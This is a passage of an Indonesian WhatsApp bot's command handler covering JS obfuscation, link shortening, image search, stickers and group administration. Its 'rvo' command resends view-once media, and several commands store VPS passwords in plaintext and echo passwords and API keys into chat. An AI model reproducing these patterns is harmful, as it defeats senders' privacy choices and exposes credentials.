            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'shortlink': case "shorturl": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'shortlink-dl': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await conn.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "idgc": case 'cekidgc': {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listpc': {
if (!isCreator) return
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${m.pushName}\n*User :* @${m.sender.split('@')[0]}\n*Chat :* https://wa.me/${m.sender.split('@')[0]}\n\n───────────\n\n`
}
return Reply(teks)
}
break

case 'listgc': case 'listgrup': {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await conn.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return Reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'cekidch': case "idch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pin": case 'pinterest': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'gimage': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("logo whatsapp"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
const res = await fetchJson(`https://api.skyzopedia.us.kg/api/search/gimage?q=${text}`)
if (!res.status) return m.reply("Error")
let total = 0
let aray
if (res.result.length < 5) {
aray = res.result
} else {
aray = res.result.slice(0, 5)
}
for (let i of aray) {
await conn.sendMessage(m.chat, {image: {url: i.url}, caption: `Hasil pencarian foto ke ${total += 1}`}, {quoted: m})
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ai': case 'gpt': case 'openai': {
if (!isCreator) return Reply(mess.owner)
let talk = text ? text : "hai"
await fetchJson("https://api.skyzopedia.us.kg/api/ai/openai-prompt?prompt=Sekarang Kamu Adalah Skyzo-Ai dan selalu gunakan bahasa Indonesia saat menjawab semua pertanyaan&msg=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'brat': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example('teksnya'))
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=false`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'bratvid':  case "bratvideo": {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'qc': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await conn.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case 'sticker': case 'stiker': {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
if (!isCreator) return Reply(mess.owner)
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'swm': case "stickerwm": case "stikerwm": case "wm": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rvo': case "readviewonce": {
if (cekUser("id", m.sender) == null) return conn.sendMessage(from, { 
    text: `⚠️ Maaf *@${m.sender.split('@')[0]}* ❗\nSepertinya kamu belum terdaftar di database 📂\n\nSilahkan ketik *.daftar* terlebih dahulu sebelum menggunakan perintah *${command}* ✅`, 
    mentions: [m.sender] 
}, { quoted: qtext2 });
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tourl': {
if (!isCreator) return Reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!/video/.test(mime) && !/image/.test(mime)) return Reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return Reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
conn.sendMessage(from, {
react: {
text: '⏰️',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./library/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
Reply(`Your Link : ${link}\nExpired Date : Liftime`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tourl2': {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Ijultaka.png');
let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case 'translate': {
if (!isCreator) return Reply(mess.owner)
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tohd': case "hd": case 'remini': {
if (!isCreator) return Reply(mess.owner)
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await conn.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await conn.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'add': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'kick': case 'kik': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'leave': {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'reset': {
  await conn.sendMessage(m.chat, {
    footer: `© 2025 ${botname}`,
    buttons: [
      {
        buttonId: 'action',
        buttonText: { displayText: 'ini pesan interactiveMeta' },
        type: 4,
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: 'Pilih Reset Lain',
            sections: [
              {
                title: 'List Reset',
                rows: [
                  {
                    title: 'RESET PENDAPATAN 💸',
                    description: 'Menghapus semua data terkait pendapatan, termasuk riwayat dan laporan keuangan.',
                    id: '.resetpendapatan'
                  },
                  {
                    title: 'RESET LINK GROUP 🔗',
                    description: 'Menghapus data link grup yang telah disetting sebelumnya, mengembalikan ke pengaturan default.',
                    id: '.resetlinkgc'
                  },
                  {
                    title: 'RESET HUTANG 💳',
                    description: 'Menghapus semua data hutang yang tercatat, termasuk rincian hutang pengguna.',
                    id: '.resethutang'
                  },
                  {
                    title: 'RESET SELLER PANEL 🛒',
                    description: 'Mereset seluruh data terkait penjual, termasuk produk dan transaksi yang terkait dengan panel penjual.',
                    id: '.resetseller'
                  },
                  {
                    title: 'RESET PREMIUM SUBDOMAIN 🛒',
                    description: 'Mereset seluruh data terkait penjual, termasuk produk dan transaksi yang terkait dengan subdomain penjual.',
                    id: '.resetprem'
                  },
                  {
                    title: 'RESET OWNER PANEL 👑',
                    description: 'Menghapus semua data pemilik panel, termasuk pengaturan admin dan kontrol sistem.',
                    id: '.resetowner'
                  },
                  {
                    title: 'RESET DATABASE 🗃️',
                    description: 'Mereset seluruh data dalam database, mengembalikan ke kondisi semula tanpa data pengguna.',
                    id: '.resetdb'
                  },
                  {
                    title: 'RESET ID CHANNEL 📱',
                    description: 'Menghapus data ID channel WhatsApp yang terdaftar dan mereset pengaturannya.',
                    id: '.resetid'
                  },
                  {
                    title: 'RESET DP 📸',
                    description: 'Menghapus semua data terkait foto profil (DP) yang telah disetting sebelumnya.',
                    id: '.resetdp'
                  }
                ]
              }
            ]
          })
        }
      }
    ],
    headerType: 1,
    viewOnce: true,
    image: { url: global.image.reply }, 
    caption: "\n```Silahkan Pilih Untuk Meriset Data Dibawah Ini!!```\n"
  }, { quoted: qtext2 })
}
break;

case 'resetlinkgc': {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'tagall': {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'linkgc': {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'savevps': {
    try {
        if (!isCreator) {
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
        }

        const path = './src/savevps.json';

        // Memuat data dari file JSON
        let vpsData = [];
        if (fs.existsSync(path)) {
            try {
                vpsData = JSON.parse(fs.readFileSync(path));
            } catch (error) {
                console.error("Error loading VPS data:", error);
                return Reply("⚠️ *Gagal membaca data VPS.*");
            }
        }

        const t = text.split(',').map(item => item.trim());
        if (t.length < 3) {
            return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} teks,ipvps,pwvps`);
        }

        const [teks, ipvps, pwvps] = t;

        // Tambahkan data baru
        vpsData.push({ teks, ipvps, pwvps });

        // Simpan data ke file JSON
        try {
            fs.writeFileSync(path, JSON.stringify(vpsData, null, 2));
        } catch (error) {
            console.error("Error saving VPS data:", error);
            return Reply("⚠️ *Terjadi kesalahan saat menyimpan data VPS.*");
        }

        Reply(`✅ *Data VPS berhasil disimpan!*\n\n📌 *Teks:* ${teks}\n🔗 *IP VPS:* ${ipvps}\n🔑 *Password VPS:* ${pwvps}`);
    } catch (error) {
        console.error("Error saat menyimpan VPS:", error);
        Reply("⚠️ *Terjadi kesalahan saat menyimpan data VPS. Silakan coba lagi!*");
    }
}
break;

case 'delsavevps': {
    try {
        if (!isCreator) {
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
        }
        const path = './src/savevps.json';

        // Memastikan ada input teks untuk menghapus data VPS
        if (!text) {
            return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} namaVps`);
        }

        // Memuat data dari file JSON
        if (!fs.existsSync(path)) {
            return Reply("⚠️ *Tidak ada data VPS yang tersimpan.*");
        }

        let vpsData;
        try {
            vpsData = JSON.parse(fs.readFileSync(path));
        } catch (error) {
            console.error("Error loading VPS data:", error);
            return Reply("⚠️ *Gagal membaca data VPS.*");
        }

        // Filter untuk menghapus VPS yang memiliki teks yang sesuai
        const newData = vpsData.filter(vps => vps.teks !== text);

        // Jika tidak ada perubahan, berarti teks tidak ditemukan
        if (newData.length === vpsData.length) {
            return Reply(`⚠️ *Data VPS dengan teks "${text}" tidak ditemukan.*`);
        }

        // Simpan kembali data yang telah diperbarui
        try {
            fs.writeFileSync(path, JSON.stringify(newData, null, 2));
        } catch (error) {
            console.error("Error saving VPS data:", error);
            return Reply("⚠️ *Terjadi kesalahan saat menghapus data VPS.*");
        }

        Reply(`✅ *Data VPS dengan teks "${text}" berhasil dihapus!*`);
    } catch (error) {
        console.error("Error saat menghapus VPS:", error);
        Reply("⚠️ *Terjadi kesalahan saat menghapus data VPS. Silakan coba lagi!*");
    }
}
break;

case 'ambilvps': {
    try {
        if (!isCreator) {
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
        }

        const path = './src/savevps.json';

        // Memuat data dari file JSON
        if (!fs.existsSync(path)) {
            return Reply("⚠️ *Tidak ada data VPS yang tersimpan.*");
        }

        let vpsData;
        try {
            vpsData = JSON.parse(fs.readFileSync(path));
        } catch (error) {
            console.error("Error loading VPS data:", error);
            return Reply("⚠️ *Gagal membaca data VPS.*");
        }

        if (vpsData.length === 0) {
            return Reply("⚠️ *Tidak ada data VPS yang tersimpan.*");
        }

        let message = "📂 *Daftar VPS Tersimpan:*\n";
        vpsData.forEach((vps, index) => {
            message += `\n🔢 *VPS ${index + 1}:*\n📌 *Teks:* ${vps.teks}\n🔗 *IP:* ${vps.ipvps}\n🔑 *Password:* ${vps.pwvps}\n`;
        });

        Reply(message);
    } catch (error) {
        console.error("Error saat mengambil VPS:", error);
        Reply("⚠️ *Terjadi kesalahan saat mengambil data VPS. Silakan coba lagi!*");
    }
}
break;

case 'addapido': {  
    try {  
        if (!isCreator) {  
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");  
        }  
  
        const t = text.split(',').map(item => item.trim());  
        if (t.length < 2) {  
            return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} apiDigitalOcean1,apiDigitalOcean2`);  
        }  
  
        const [newApiDigitalOcean, newApiDigitalOcean2] = t;  
  
        // Update konfigurasi global  
        global.apiDigitalOcean = newApiDigitalOcean;  
        global.apiDigitalOcean2 = newApiDigitalOcean2;  
  
        // Ambil jumlah droplet dari kedua akun  
        const fetchDropletCount = async (apiKey) => {  
            try {  
                const response = await fetch('https://api.digitalocean.com/v2/droplets', {  
                    headers: {  
                        Authorization: `Bearer ${apiKey}`  
                    }  
                });  
                const data = await response.json();  
                return data.droplets ? data.droplets.length : 0;  
            } catch (error) {  
                console.error("Error fetching droplets:", error);  
                return '⚠️ Gagal mengambil data';  
            }  
        };  
  
        const dropletsCount1 = await fetchDropletCount(newApiDigitalOcean);  
        const dropletsCount2 = await fetchDropletCount(newApiDigitalOcean2);  
  
        const replyMessage = `✨ *Konfigurasi Berhasil Diperbarui!*\n\n🔑 API DigitalOcean: *${newApiDigitalOcean}*\n🔑 API DigitalOcean 2: *${newApiDigitalOcean2}*\n\n📌 *Jumlah Droplet Akun 1:* ${dropletsCount1}\n📌 *Jumlah Droplet Akun 2:* ${dropletsCount2}`;  
  
        Reply(replyMessage);  

    } catch (error) {  
        console.error("Error saat memperbarui konfigurasi:", error);  
        Reply("⚠️ *Terjadi kesalahan saat memperbarui konfigurasi. Silakan coba lagi!*");  
    }  
}  
break;

case 'adddomain': {
    try {
        if (!isCreator) {
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
        }

        const t = text.split(',').map(item => item.trim());
        if (t.length < 3) {
            return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com,apikeybaru,capikeybaru`);
        }

        const [newDomain, newApiKey, newCaApiKey] = t;

        // Update konfigurasi global
        global.domain = newDomain;
        global.apikey = newApiKey;
        global.capikey = newCaApiKey;

        const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        Reply(`✨ *Konfigurasi Berhasil Diperbarui!*\n\n🌐 Domain: *${newDomain}*\n🔑 API Key: *${newApiKey}*\n🔑 CA API Key: *${newCaApiKey}*`);

        // Kirim pemberitahuan ke owner
        const ownerJid = `${global.owner}@s.whatsapp.net`;
        await conn.sendMessage(ownerJid, {
            text: `📢 *Pemberitahuan Perubahan Konfigurasi*\n\n🌐 *Domain Baru:* ${newDomain}\n🔑 *API Key Baru:* ${newApiKey}\n🔑 *CA API Key Baru:* ${newCaApiKey}\n🕒 *Tanggal & Waktu:* ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
        });
    } catch (error) {
        console.error("Error saat memperbarui konfigurasi:", error);
        Reply("⚠️ *Terjadi kesalahan saat memperbarui konfigurasi. Silakan coba lagi!*");
    }
}
break;

case 'adddomain-v2': {
    try {
        if (!isCreator) {
            return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
        }

        const t = text.split(',').map(item => item.trim());
        if (t.length < 3) {
            return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} domain.com,apikeybaru,capikeybaru`);
        }

        const [newDomain, newApiKey, newCaApiKey] = t;

        // Update konfigurasi global
        global.domainV2 = newDomain;
        global.apikeyV2 = newApiKey;
        global.capikeyV2 = newCaApiKey;

        const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        Reply(`✨ *Konfigurasi Berhasil Diperbarui!*\n\n🌐 Domain: *${newDomain}*\n🔑 API Key: *${newApiKey}*\n🔑 CA API Key: *${newCaApiKey}*`);

        // Kirim pemberitahuan ke owner
        const ownerJid = `${global.owner}@s.whatsapp.net`;
        await conn.sendMessage(ownerJid, {
            text: `📢 *Pemberitahuan Perubahan Konfigurasi*\n\n🌐 *Domain Baru:* ${newDomain}\n🔑 *API Key Baru:* ${newApiKey}\n🔑 *CA API Key Baru:* ${newCaApiKey}\n🕒 *Tanggal & Waktu:* ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
        });
    } catch (error) {
        console.error("Error saat memperbarui konfigurasi:", error);
        Reply("⚠️ *Terjadi kesalahan saat memperbarui konfigurasi. Silakan coba lagi!*");
    }
}
break;

case 'link': {
    if (!isCreator) return Reply(mess.owner);

    let teks = `🔗 *Link Admin Panel:*\n${global.linkadp}\n\n🛒 *Link Reseller Panel:*\n${global.linkseller}`;

    await conn.sendMessage(m.chat, {
        text: teks,
        footer: `© 2025 ${botname}`,
        buttons: [
            { buttonId: `.owner`, buttonText: { displayText: '👨‍💻 Hubungi Developer' }, type: 1 }
        ],
        headerType: 1,
        viewOnce: true,
        contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"], 
        }
    }, { quoted: m });
}
break;

case 'uplinkadp': {
    const newLinkAdp = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newLinkAdp) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://linkadp.com`);
    }

    global.linkadp = newLinkAdp; // Update linkadp global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Link ADP Berhasil Diganti!*\n\n🔗 Link baru: *${newLinkAdp}*`);

    // Kirim pemberitahuan ke owner
    const ownerJid = `${global.owner}@s.whatsapp.net`;
    conn.sendMessage(ownerJid, {
        text: `📢 *Pemberitahuan Perubahan Link ADP*\n\n🔗 Link ADP telah diganti:\n- *Link Baru*: ${newLinkAdp}\n- *Tanggal & Waktu*: ${waktu}\n\n⚙️ Sistem Bot Anda telah diperbarui.`,
    });
}
break;

case 'uplinkseller': {
    const newLinkSeller = m.quoted ? m.quoted.text : text; // Mendapatkan teks dari input atau quote
    if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");
    if (!newLinkSeller) {
        return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://linkseller.com`);
    }

    global.linkseller = newLinkSeller; // Update linkseller global
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    Reply(`✨ *Link Seller Berhasil Diganti!*\n\n🔗 Link baru: *${newLinkSeller}*`);

    // Kirim pemberitahuan ke owner
